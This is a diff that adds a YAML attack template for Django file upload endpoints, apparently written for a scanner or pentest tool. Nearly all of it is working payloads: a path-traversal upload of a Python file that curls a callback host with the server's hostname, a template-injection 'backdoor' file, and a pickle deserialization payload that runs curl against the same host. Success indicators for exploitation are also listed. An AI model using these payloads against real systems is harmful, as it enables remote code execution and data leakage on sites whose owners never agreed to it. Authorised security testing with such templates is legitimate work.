@@ -1,0 +1,51 @@
+name: "Django File Upload Attack"
+description: "Tests Django file upload endpoints for vulnerabilities"
+author: "@HaakimSec"
+version: "1.0"
+tech_stack: "python"
+
+target:
+  endpoint: "/api/upload/"
+  method: "POST"
+  param: "file"
+
+headers:
+  Content-Type: "multipart/form-data"
+  X-CSRFToken: "{{csrf_token}}"
+
+payloads:
+  - name: "Python reverse shell via Django media"
+    filename: "../../../media/shell.py"
+    extension: ".py"
+    body: |
+      import os
+      os.system('curl https://callback.server/rce?host=$(hostname)')
+    tags: ["django", "python", "path-traversal"]
+
+  - name: "Django template injection"
+    filename: "../../../templates/backdoor.html"
+    extension: ".html"
+    body: |
+      {% load static %}
+      {{ request|attr:'environ'|attr:'__getitem__'|__call__:'CMD' }}
+    tags: ["django", "ssti", "template-injection"]
+
+  - name: "Python pickle deserialization"
+    filename: "payload.pkl"
+    extension: ".pkl"
+    content_type: "application/octet-stream"
+    body: |
+      cos
+      system
+      (S'curl https://callback.server/rce'
+      tR.
+    tags: ["django", "pickle", "deserialization"]
+
+success_indicators:
+  - "\"status\":\"success\""
+  - "File uploaded successfully"
+  - "201 Created"
+
+failure_indicators:
+  - "Invalid file type"
+  - "File type not supported"
